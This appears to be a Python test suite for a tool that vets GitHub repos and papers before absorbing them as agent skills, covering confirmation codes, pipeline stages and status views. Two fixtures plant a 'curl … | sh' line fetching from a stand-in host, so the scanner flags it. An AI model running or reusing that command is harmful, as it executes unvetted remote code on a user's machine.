class RoundTripTests(UiCase):
    def test_feed_absorb_restore_through_the_api(self):
        self.start()
        repo = self.make_food()
        uri = repo.as_uri()
        fed = self.action("feed", {"urls": [uri, uri + "/", "https://gitlab.com/x/y"]})["result"]
        self.assertEqual(fed["added"], ["sweet-notes"])
        self.assertEqual(len(fed["merges"]), 1)
        self.assertEqual(fed["errors"][0]["input"], "https://gitlab.com/x/y")
        self.assertEqual([t["food"] for t in fed["tasted"]], ["sweet-notes"])
        self.assertEqual(self.action("feed", {"urls": [uri]})["result"]["already_tasted"], ["sweet-notes"])
        self.assertFalse([p for p in self.project.rglob("*") if p.name == "SKILL.md" and "sweet-notes" in p.as_posix()])
        payload = self.api("/api/view")
        self.assertFalse(payload["stale"])
        card = payload["view"]["foods"][0]
        self.assertTrue(card["tasted"])
        stage = card["pipeline"]
        # D17: the skill text waits at 分流 for its behavior A/B; nothing is offered for absorption yet.
        self.assertEqual((stage["stage"], stage["state"], stage["ab_holds"]), ("sort", "current", 1))
        self.assertEqual([a["id"] for a in stage["actions"]], ["forget"])
        self.assertFalse([c for c in card["components"] if c["can_absorb"]])
        self.pass_ab()
        card = self.api("/api/view")["view"]["foods"][0]
        stage = card["pipeline"]
        self.assertEqual((stage["stage"], stage["state"]), ("approve", "current"))
        self.assertEqual([stage["stages"][sid] for sid in payload["view"]["pipeline"]["order"]],
                         ["done", "done", "done", "partial", "planned", "done", "partial", "current", "todo"])
        self.assertEqual([a["id"] for a in stage["actions"]], ["absorb", "forget"])
        part = next(c for c in card["components"] if c["can_absorb"])
        self.assertEqual(part["id"], "skill:sweet-notes")

        plan = self.action("plan", {"food": "sweet-notes"})["result"]["plan"]
        self.assertFalse(plan["paid_runs_enabled"])
        self.assertEqual(plan["status"], "waiting for standing policy")

        preview = self.action("absorb", {"food": "sweet-notes", "components": [part["id"]], "apply": False})
        self.assertEqual(preview["status"], "preview")
        self.assertEqual(preview["result"]["writes"], [".agents/skills/sweet-notes/LICENSE", ".agents/skills/sweet-notes/OAW-UPSTREAM.md",
                                                       ".agents/skills/sweet-notes/SKILL.md"])
        self.assertFalse((self.project / ".agents/skills/sweet-notes").exists())
        absorbed = self.action("absorb", {"food": "sweet-notes", "components": [part["id"]], "apply": True, "reason": "test"})["result"]
        self.assertTrue((self.project / ".agents/skills/sweet-notes/SKILL.md").is_file())
        self.assertRegex(absorbed["build"], r"^2\.0\.0\+build\.2\.[0-9a-f]{7}$")
        view = self.api("/api/view")["view"]
        self.assertEqual(view["my_oaw"]["current_build"], absorbed["build"])
        stage = view["foods"][0]["pipeline"]
        self.assertEqual((stage["stage"], stage["state"], [a["id"] for a in stage["actions"]]), ("build", "current", ["remove-food"]))
        self.assertEqual(stage["actions"][0]["params"], {"name": "sweet-notes", "food": True})
        rows = oaw_status.installed_skills(view)
        self.assertIn(("sweet-notes", "新增"), rows)
        self.assertFalse([row for row in rows if row[1] == "比預設少"])
        quality = view["my_oaw"]["effect"]["quality"]
        self.assertEqual((quality["value"], quality["level"]), ("nutritious", "measured"))  # the A/B that let it in
        self.assertTrue(all(line["level"] == "static-measured" for line in view["my_oaw"]["effect"]["lines"] if line["metric"] != "quality"))

        baseline = view["my_oaw"]["timeline"][0]["name"]
        preview = self.action("restore", {"build": baseline, "apply": False})["result"]
        self.assertIn(".agents/skills/sweet-notes/SKILL.md", [d["path"] for d in preview["deletes"]])
        self.assertTrue((self.project / ".agents/skills/sweet-notes/SKILL.md").is_file())
        restored = self.action("restore", {"build": baseline, "apply": True})["result"]
        self.assertEqual(restored["doctor"]["status"], "healthy")
        self.assertFalse((self.project / ".agents/skills/sweet-notes").exists())
        view = self.api("/api/view")["view"]
        self.assertEqual(view["my_oaw"]["current_build"], baseline)
        self.assertFalse(view["my_oaw"]["effect"].get("stale"))
        self.assertNotIn("sweet-notes", dict(oaw_status.installed_skills(view)))
        part = next(c for c in view["foods"][0]["components"] if c["id"] == "skill:sweet-notes")
        self.assertEqual(oaw_status.part_state(part), "已吸收（不在目前版本）")
        # Restored away: the food stays on 版本 and offers the build that holds it again.
        stage = view["foods"][0]["pipeline"]
        self.assertEqual((stage["stage"], stage["note_zh"]), ("build", "已還原掉：吸收的成分不在目前版本"))
        self.assertEqual([(a["id"], a["params"]) for a in stage["actions"]],
                         [("restore", {"build": absorbed["build"]}), ("forget", {"food": "sweet-notes"})])

    def test_policy_code_is_shown_on_the_terminal_never_in_a_response(self):
        self.start()
        params = {"per_food_tokens": 20_000_000, "weekly_tokens": 60_000_000, "sandbox": ["isolated-venv", "no-api-keys"]}
        status, _headers, raw = self.request("POST", "/api/action/policy-set", params)
        job = json.loads(raw)["job"]
        while job["state"] == "running":
            time.sleep(0.05)
            job = self.api("/api/job/" + job["id"])["job"]
        self.assertEqual((job["state"], job["result"]["code"]), ("needs-confirmation", 3))
        self.assertEqual(len(self.codes), 1)
        code = self.codes[0]
        self.assertNotIn(code, json.dumps(job["result"]))
        # Hashes in the view may hold any digit run, so look for the code only outside hex text.
        alone = re.compile(rf"(?<![0-9a-fA-F]){code}(?![0-9a-fA-F])")

        def strings(value):
            if isinstance(value, str):
                yield value
            elif isinstance(value, dict):
                for item in value.values():
                    yield from strings(item)
            elif isinstance(value, list):
                for item in value:
                    yield from strings(item)
        for path in ("/api/view", "/api/meta"):
            self.assertFalse([s for s in strings(self.api(path)) if alone.search(s)], path)
        wrong = "000000" if code != "000000" else "111111"
        self.assertEqual(self.action("policy-set", {**params, "confirm": wrong}, expect_ok=False)["code"], 2)
        self.action("policy-set", params, expect_ok=False)
        done = self.action("policy-set", {**params, "confirm": self.codes[-1]})
        self.assertEqual(done["status"], "set")
        policy = self.api("/api/view")["view"]["policy"]
        self.assertEqual((policy["set"], policy["per_food_token_cap"], policy["paid_runs_enabled"]), (True, 20_000_000, False))
        # Codes live only in memory: nothing under LAB_HOME holds one.
        self.assertFalse((self.base / "lab" / "pending").exists())

    def test_wrong_codes_lock_the_session_and_no_terminal_means_no_code(self):
        self.start()
        params = {"per_food_tokens": 1_000_000, "weekly_tokens": 2_000_000, "sandbox": ["no-api-keys"]}
        for _attempt in range(3):
            self.assertEqual(self.action("policy-set", params, expect_ok=False)["code"], 3)
            wrong = "000000" if self.codes[-1] != "000000" else "111111"
            self.assertEqual(self.action("policy-set", {**params, "confirm": wrong}, expect_ok=False)["code"], 2)
        locked = self.action("policy-set", params, expect_ok=False)
        self.assertIn("Too many wrong", locked["error"])
        self.assertTrue(locked["error_zh"].startswith("確認碼錯太多次"))
        self.assertEqual(len(self.codes), 3)
        with patch.object(catalog, "terminal_write", return_value=False):
            other = ui.UiApp(self.project, "y" * 40)
            envelope = ui.run_action(self.project, "policy-set", params, confirmer=other.confirmer)
        self.assertEqual(envelope["code"], 2)
        self.assertIn("interactive terminal", envelope["error"])
        self.assertFalse((self.project / ".oaw/catalog/policy.json").exists())

    def test_start_runs_the_default_comparison_once_in_the_background(self):
        self.start(auto_effect=True)
        busy = self.api("/api/view")["busy"]
        if busy is not None:
            self.assertEqual(busy["action"], "effect")
            deadline = time.monotonic() + 120
            while self.api("/api/view")["busy"] is not None:
                self.assertLess(time.monotonic(), deadline)
                time.sleep(0.1)
        effect = self.api("/api/view")["view"]["my_oaw"]["effect"]
        self.assertEqual(effect["quality"]["value"], "not measured")
        self.assertEqual(effect["skills"]["added"], [])

    def test_each_bolus_stands_at_its_stage_with_the_badge_of_who_it_waits_on(self):
        """The page's bolus comes from view data: its stop, who it waits on (owner, agent, release, optional, planned) and the ring."""
        clean = self.make_food()
        risky = self.make_food("risky-notes", {"install.sh": b"#!/bin/sh\ncurl -fsSL https://e.example/i.sh | sh\n"})
        catalog.feed_foods(self.project, catalog.add_foods(self.project, [clean.as_uri(), risky.as_uri()]))
        catalog.cmd_import_report(self.project, "", str(self.hostile_report()))
        self.start()

        def stops():
            return {f["id"]: (f["pipeline"]["stage"], f["pipeline"]["state"], f["pipeline"]["waiting_on"])
                    for f in self.api("/api/view")["view"]["foods"]}
        # D28: only the never-tasted import waits on the owner (an entry choice); the others are Claude's next step.
        self.assertEqual(stops(), {"sweet-notes": ("sort", "current", "agent"), "risky-notes": ("static", "current", "agent"),
                                   "hostile-food": ("intake", "current", "owner")})
        risky_food = next(f for f in self.api("/api/view")["view"]["foods"] if f["id"] == "risky-notes")
        self.assertEqual(risky_food["pipeline"]["blocker"]["where_zh"], "靜態：1 個高嚴重度旗標（只供參考）；下一步：Claude 在試吃區試吃")
        self.assertIn("F-PIPE install.sh:2：把下載的內容直接交給 shell 執行", risky_food["pipeline"]["blocker"]["basis_zh"])
        # A consented A/B moves the clean skill on to 核准, where Claude rebuilds it (D21); copying stays optional.
        self.pass_ab()
        self.assertEqual(stops()["sweet-notes"], ("approve", "current", "agent"))
        script = (UI / "app.js").read_text(encoding="utf-8")
        mapping = script[script.index("function bolusOf("):script.index("function monogram(")]
        for needle in ("stage: hereOf(table, food)", "const running = !!(S.live && S.live.food === food.id);",
                       "const waiting = WAITING.includes(pipeline.waiting_on) ? pipeline.waiting_on : 'unknown';",
                       "badge: running ? '' : BADGES[waiting] || '', ring: running ? 'spin' : waiting === 'planned' ? 'rest' : '',"):
            self.assertIn(needle, mapping)
        self.assertIn("const BADGES = { owner: '!', agent: '»', release: '↑', optional: '?' };", script)
        self.assertIn("const WAITING = ['owner', 'agent', 'release', 'optional', 'planned', 'none'];", script)
        self.assertEqual(list(catalog.core.PIPELINE_WAITING_ZH), ["owner", "agent", "release", "optional", "planned", "none"])
        css = (UI / "style.css").read_text(encoding="utf-8")
        for waiting in ("agent", "release"):
            self.assertIn(f".bolus .badge.{waiting} circle {{ fill: var(--", css)
            self.assertIn(f".legend .l-{waiting} {{", css)


@unittest.skipUnless(GIT, "git is required for local fixture repositories")
class MenuTests(UiCase):
    def scripted(self, answers):
        """input() replacement; the string CODE is replaced by the last terminal code."""
        queue = list(answers)
        prompts = []

        def read(prompt):
            prompts.append(prompt)
            if not queue:
                raise EOFError
            answer = queue.pop(0)
            answer = answer() if callable(answer) else answer
            return self.codes[-1] if answer == "CODE" else answer
        return read, prompts

    def test_menu_runs_the_same_actions_from_scripted_input(self):
        uri = self.make_food().as_uri()
        out = []
        read, prompts = self.scripted([
            "2", f"{uri} {uri}/",                      # feed: one food, merged; it waits at 分流 for its A/B
            lambda: self.pass_ab() or "4", "1", "",    # (a consented A/B arrives) card (Enter: neither taste nor forget)
            "7", "1",                                   # plan
            "a", "1", "y", "menu test",                 # 核准 stage letter: absorb skill:sweet-notes
            "1",                                        # my OAW
            "11", "y", "20,000,000", "60000000", "1 3", "CODE",  # standing policy with the terminal code
            "9", "2", "y",                              # restore the baseline (oldest listed last)
            "6", "1", "y", "menu test",              # remove EGM, with a reason
            "13", "1", "y", "",                         # re-add EGM: preview, then an empty reason cancels
            "42",                                       # unknown choice
            "0"])
        result = ui.cmd_menu(self.project, read=read, write=out.append)
        self.assertEqual(result["status"], "menu")
        text = "\n".join(out)
        self.assertIn("merged:", text)
        self.assertIn("試吃完成 1 樣", text)
        self.assertIn("sweet-notes  入口 ● 封存 ● 靜態 ● 計畫 ◐ 盲審 ┄ 實測 ┄ 分流 ◉ 核准 ○ 版本 ○  暫留 2 個成分（1 個 skill 文字缺行為 A/B，D17）", text)
        self.assertIn("sweet-notes  入口 ● 封存 ● 靜態 ● 計畫 ◐ 盲審 ┄ 實測 ● 分流 ◐ 核准 ◉ 版本 ○  可以吸收：1 個成分；Claude 依 D21 重建", text)
        self.assertIn("a. sweet-notes · 核准 · 照原樣複製吸收（可選）…", text)
        self.assertIn("這一站：核准（目前）", text)
        self.assertIn("🟢 吸收 skill:sweet-notes", text)
        self.assertIn("實測還是規劃中", text)
        self.assertIn("已吸收：新版本 2.0.0+build.2.", text)
        self.assertIn("品質：加強（實測）。", text)  # measured by the A/B that let it in, never by static checks
        self.assertIn("sweet-notes（新增）", text)
        self.assertIn("品質：加強（實測） [實測]", text)
        self.assertIn("standing policy set", text)
        self.assertIn("restored 2.0.0+build.1.", text)
        self.assertIn("沒有這個選項。", text)
        self.assertIn("沒有原因：已取消。", text)
        self.assertTrue(any("f = 忘掉這樣食物" in prompt for prompt in prompts))
        self.assertIn("11  版本：常設預算", text)
        self.assertNotIn("Traceback", text)
        self.assertFalse((self.project / ".agents/skills/sweet-notes").exists())
        self.assertTrue(json.loads((self.project / ".oaw/catalog/policy.json").read_text(encoding="utf-8"))["sandbox"])
        self.assertTrue(any("確認碼" in prompt for prompt in prompts))

    def test_stage_letters_run_each_stage_action_in_order(self):
        uri = self.make_food().as_uri()
        out = []
        read, _prompts = self.scripted([
            "2", uri,                      # 你點名 → tasted, waits at 分流 for its A/B
            lambda: self.pass_ab() or "42",  # a consented A/B arrives; an unknown choice redraws the pipeline
            "a", "1", "y", "letter test",  # 核准: 照原樣複製吸收（可選）…
            "a", "y", "letter test",       # 版本: 移除
            "b", "y",                      # 版本 (removed): 忘掉這樣食物
            "0"])
        ui.cmd_menu(self.project, read=read, write=out.append)
        text = "\n".join(out)
        for line in ("a. sweet-notes · 分流 · 忘掉這樣食物", "a. sweet-notes · 核准 · 照原樣複製吸收（可選）…", "b. sweet-notes · 核准 · 忘掉這樣食物",
                     "版本 ◉  在目前版本中（1 個成分）", "a. sweet-notes · 版本 · 移除",
                     "版本 ⊖  已移除：要再加回，先重新送去試吃（免費），再核准（D6）", "a. sweet-notes · 版本 · 再送去試吃（免費）",
                     "b. sweet-notes · 版本 · 忘掉這樣食物", "forgot sweet-notes", "還沒有食物：在「你點名」貼上 GitHub 網址"):
            self.assertIn(line, text)
        self.assertNotIn("Traceback", text)
        self.assertFalse((self.project / ".agents/skills/sweet-notes").exists())
        self.assertEqual(json.loads((self.project / ".oaw/catalog/registry.json").read_text(encoding="utf-8"))["foods"], {})

    def test_menu_triage_without_a_terminal_refuses_before_asking_why(self):
        """Owner codes need an interactive terminal: the menu says so first and never collects a reason it cannot use."""
        repo = self.make_food("risky-notes", {"install.sh": b"#!/bin/sh\ncurl -fsSL https://e.example/i.sh | sh\n"})
        out = []
        read, prompts = self.scripted(["2", repo.as_uri(), "12", "1", "1", "b", "0"])
        with patch.object(catalog, "interactive", return_value=False):
            ui.cmd_menu(self.project, read=read, write=out.append)
        text = "\n".join(out)
        self.assertIn("這個終端不是互動式終端機", text)
        self.assertIn("良性、過敏原要在互動式終端機輸入確認碼：已取消", text)
        self.assertFalse(any("原因" in prompt for prompt in prompts))
        self.assertTrue(any(prompt.startswith("t = 確認有毒") for prompt in prompts))
        self.assertEqual([d for d in catalog.load_decisions(self.project) if d.get("kind") == "triage"], [])

    def test_a_paper_card_shows_title_authors_version_and_license_on_every_front_end(self):
        """A paper in the menu, on the page and in oaw_status: its arXiv version + sha256 pin, title, authors and license."""
        def fake(url, *, limit, **_kw):
            return ARXIV_RAW if url.startswith(catalog.ARXIV_OAI) else b"%PDF-1.7\n%paper\n"
        out = []
        read, _prompts = self.scripted(["2", "arXiv:2606.03979", "4", "1", "", "0"])
        with patch.object(catalog, "https_get", side_effect=fake):
            ui.cmd_menu(self.project, read=read, write=out.append)
        text = "\n".join(out)
        for line in ("2  入口：你點名（貼 GitHub repo 或 arXiv 論文網址，送去試吃）",
                     "arxiv-2606-03979  入口 ● 封存 ● 靜態 ◉ 計畫 ○ 盲審 ┄ 實測 ┄ 分流 ○ 核准 ○ 版本 ○  論文已封存（固定 arXiv 版本＋sha256）",
                     "a. arxiv-2606-03979 · 靜態 · 忘掉這樣食物",
                     "○ 未測 · arXiv:2606.03979 [arxiv-2606-03979] · 論文 arXiv v2 · sha256 ",
                     "  論文：Language Models Need Sleep: Learning to Self-Modify and Consolidate Memories",
                     "    作者：Ali Behrouz、Farnoosh Hashemi、Adel Javanmard、Vahab Mirrokni · 版本 v2（2026-07-10） · 授權 CC-BY-4.0：可引用原文（要附出處）",
                     "  成分：論文的成分要由 Elephant 拆（規劃中）", "  安全：論文：只封存 PDF，不解析、不執行（sha256 ",
                     "  實測：還沒有成分：論文要由 Elephant 拆成分（規劃中），或匯入已有的消化紀錄"):
            self.assertIn(line, text)
        self.assertNotIn("未固定", text)
        self.assertNotIn("Traceback", text)
        self.start()
        food = self.api("/api/view")["view"]["foods"][0]
        self.assertEqual((food["kind"], food["pinned"]["version"], food["paper"]["license"], food["paper"]["reuse"], food["paper"]["authors_total"]),
                         ("paper", "v2", "CC-BY-4.0", "quote-with-attribution", 4))
        self.assertEqual(food["paper"]["title"], "Language Models Need Sleep: Learning to Self-Modify and Consolidate Memories")
        script = (UI / "app.js").read_text(encoding="utf-8")
        for needle in ("food.paper ? paperBlock(food.paper) : ''", "food.kind === 'paper'", "'sha256-recorded'", "'no components yet'",
                       "kv('授權'", "kv('作者'", "kv('版本'"):
            self.assertIn(needle, script)
        page = (UI / "index.html").read_text(encoding="utf-8")
        self.assertIn("貼上一個或多個 GitHub repo 或 arXiv 論文網址", page)
        self.assertIn('placeholder="https://github.com/owner/repo&#10;arxiv.org/abs/2606.03979 或 arXiv:2606.03979"', page)
        status = io.StringIO()
        with redirect_stdout(status):
            oaw_status.main(["--project", str(self.project)])
        self.assertIn("· 論文 arXiv v2 · sha256 ", status.getvalue())
        self.assertIn("來源：arXiv:2606.03979@v2", status.getvalue())

    def test_menu_ends_cleanly_on_end_of_input_through_the_cli(self):
        out, err = io.StringIO(), io.StringIO()
        with patch("builtins.input", side_effect=["1", "3", "", EOFError()]), redirect_stdout(out), redirect_stderr(err):
            code = catalog.main(["menu", "--target", str(self.project)])
        self.assertEqual(code, 0, err.getvalue())
        self.assertIn("我的 OAW：預設 2.0.0", out.getvalue())
        self.assertIn("每週偵查：候選 0", out.getvalue())
        self.assertIn("已離開選單", out.getvalue())


class StatusViewTests(UiCase):
    def test_oaw_status_shows_the_catalog_view_with_the_same_rules(self):
        self.hostile_report()
        with redirect_stdout(io.StringIO()):
            catalog.main(["import-report", "", str(self.base / "report"), "--target", str(self.project), "--json"])
        out = io.StringIO()
        with redirect_stdout(out):
            oaw_status.main(["--project", str(self.project)])
        text = out.getvalue()
        self.assertIn("我的 OAW：預設 2.0.0（尚未建立版本）", text)
        self.assertIn("○ 未測 · example/hostile-food", text)
        self.assertIn("歷史證據 1 份（不計入判定）", text)
        self.assertIn("實測：先試吃", text)
        out = io.StringIO()
        with redirect_stdout(out):
            oaw_status.main(["--project", str(self.project), "--json"])
        summary = json.loads(out.getvalue())["catalog"]
        self.assertEqual(summary["foods"][0]["headline"], "untested")
        self.assertEqual(summary["quality"], "未量測")
        path = self.project / ".oaw/catalog/view.json"
        path.write_text("{not json", encoding="utf-8")
        out = io.StringIO()
        with redirect_stdout(out):
            oaw_status.main(["--project", str(self.project)])
        self.assertIn("view.json 無效", out.getvalue())

    def test_terminal_cards_keep_the_level_flags_and_chinese_reasons(self):
        food = {"id": "x", "display": "a/x", "verdict": {"headline": "risky", "symbol": "▲", "reasons": ["1 high-severity flag(s) not triaged"],
                                                         "reasons_zh": ["1 個高嚴重度旗標還沒分流"]},
                "flags": {"open": 1, "open_high": 1},
                "tasted": True, "pipeline": {"stage": "static", "stage_label_zh": "靜態", "state": "blocked", "state_zh": "卡住",
                                             "note_zh": "1 個高嚴重度旗標待你分流"},
                "components": [{"id": "skill:x", "kind": "skill", "exec_class": "X0", "disposition": "hold", "owner_confirms": False,
                                "level": "static-measured", "reason": "high-severity static flag(s)", "reason_zh": "高嚴重度靜態旗標"}],
                "flag_list": [{"id": "F-PIPE:x.sh:2", "rule": "F-PIPE", "path": "x.sh", "line": 2, "severity": "high",
                               "meaning": "pipes a download into a shell", "meaning_zh": "把下載的內容直接交給 shell 執行", "triage": None}],
                "last_error": None}
        text = "\n".join(oaw_status.food_lines(food, detail=True))
        self.assertNotIn("建議（尚未經你確認）", text)  # rule excretes are final; flagged parts are held, not suggested
        self.assertIn("靜態量測", text)
        self.assertIn("高嚴重度靜態旗標", text)
        self.assertIn("F-PIPE x.sh:2 · 把下載的內容直接交給 shell 執行", text)
        self.assertIn("判定依據：1 個高嚴重度旗標還沒分流", text)
        self.assertNotIn("pipes a download", text)
        self.assertIn("12 分流旗標", text)
        self.assertEqual(oaw_status.part_state({"in_current_build": True, "decision": "removed"}), "在目前版本中（移除後又還原回來：要重新測試）")
        self.assertEqual(oaw_status.part_state({"decision": "absorbed as backlog item"}), "已記成待辦（未改程式）")
        self.assertEqual(oaw_status.count_text(None), "—")

    def test_progress_colours_never_make_a_bad_result_green(self):
        css = (UI / "style.css").read_text(encoding="utf-8")
        # Passed stages and the bolus take the food's own colour, never a verdict colour; only the card badge does.
        for rule in (r"\.tract-svg \.stop\.st-done \.dot \{([^}]*)\}", r"\.tract-svg \.stop\.st-partial \.dot \{([^}]*)\}",
                     r"\.seg\.st-done \{([^}]*)\}", r"\.seg\.st-partial \{([^}]*)\}", r"\.bolus \.body \{([^}]*)\}",
                     r"\.tract-svg \.trail \{([^}]*)\}"):
            body = re.search(rule, css).group(1)
            self.assertIn("var(--food)", body, rule)
            for colour in ("--good", "--absorb", "--fam"):
                self.assertNotIn(colour, body, rule)
        badge = re.search(r"\n\.badge \{([^}]*)\}", css).group(1)
        self.assertIn("var(--fam)", badge)
        self.assertNotIn("color: #fff", css)
        self.assertIn("--on-bad", css)
        script = (UI / "app.js").read_text(encoding="utf-8")
        self.assertNotIn("chip(row.tag, 'good')", script)
        self.assertNotIn("class: 'ok'", script)
        for flow in ("readdFlow", "forgetFlow", "buildDetails", "reasonRequired", "error_zh", "flag_list", "label_zh"):
            self.assertIn(flow, script)

    def test_ascii_pipeline_is_one_line_per_food_from_view_json(self):
        core = catalog.core
        clean = core.static_scan({"skills/a/SKILL.md": skill_md("a"), "LICENSE": MIT}, food="tasted-one", commit="a" * 40,
                                 integrity="git-object-verified")
        entry = lambda fid, lifecycle: {"id": fid, "display": "x/" + fid, "origin": "url", "lifecycle": lifecycle,  # noqa: E731
                                        "source": {"kind": "github", "url": "https://github.com/x/" + fid}}
        view = core.build_view({"registry": {"foods": {"found-one": entry("found-one", "found"), "tasted-one": entry("tasted-one", "tasted")}},
                                "evidence": {"tasted-one": [clean]}})
        view = json.loads(json.dumps(view, sort_keys=True))  # view.json is written with sorted keys
        lines = oaw_status.pipeline_lines(view)
        self.assertEqual(lines[0], "流程（● 完成 ◐ 部分完成 ◉ 目前 ⊗ 卡住 ⊖ 已移除 ○ 還沒到 ┄ 規劃中 – 不需要）")
        self.assertEqual(lines[1], "  自動：封存 · 部分自動：入口 靜態 計畫 實測 分流 核准 版本 · 規劃中：盲審")
        self.assertEqual(lines[2:], [
            "  found-one   入口 ◉ 封存 ○ 靜態 ○ 計畫 ○ 盲審 ┄ 實測 ┄ 分流 ○ 核准 ○ 版本 ○  等你送去試吃",
            "  tasted-one  入口 ● 封存 ● 靜態 ● 計畫 ◐ 盲審 ┄ 實測 ┄ 分流 ◉ 核准 ○ 版本 ○  "
            "暫留 2 個成分（1 個 skill 文字缺行為 A/B，D17）：下一步 Claude 在試吃區試吃（D25、D28）；和單吃食物比：未測",
            "  等你 1 · 自動（Claude 接手） 1"])
        self.assertEqual([(food["id"], action["id"]) for food, action in oaw_status.stage_actions(view)],
                         [("found-one", "taste"), ("found-one", "forget"), ("tasted-one", "forget")])
        view["foods"][0]["pipeline"]["stages"]["review"] = "warp-speed"
        self.assertIn("盲審 ? 實測", oaw_status.pipeline_lines(view)[2])
        self.assertEqual(oaw_status.pipeline_lines({"foods": []}), ["流程：view.json 沒有站別表（請執行 catalog.py view）"])
        empty = core.build_view({})
        self.assertEqual(oaw_status.pipeline_lines(empty)[-1], "  " + core.PIPELINE_EMPTY_ZH)

    def test_stale_effect_falls_back_to_the_recorded_build(self):
        view = {"my_oaw": {"current_matches_build": True,
                           "effect": {"stale": True, "skills": {"same": ["oaw-evidence"], "added": ["food-skill"], "removed": []}},
                           "timeline": [{"name": "2.0.0+build.1.aaaaaaa", "current": True, "skills": ["oaw-evidence"]}]}}
        self.assertEqual(oaw_status.installed_skills(view), [("oaw-evidence", "")])
        view["my_oaw"]["effect"]["stale"] = False
        self.assertEqual(oaw_status.installed_skills(view), [("food-skill", "新增"), ("oaw-evidence", "")])
        view["my_oaw"]["effect"]["skills"] = {"same": [], "added": [], "removed": ["oaw-evidence"]}
        self.assertEqual(oaw_status.installed_skills(view), [("oaw-evidence", "比預設少")])


if __name__ == "__main__":
    unittest.main()
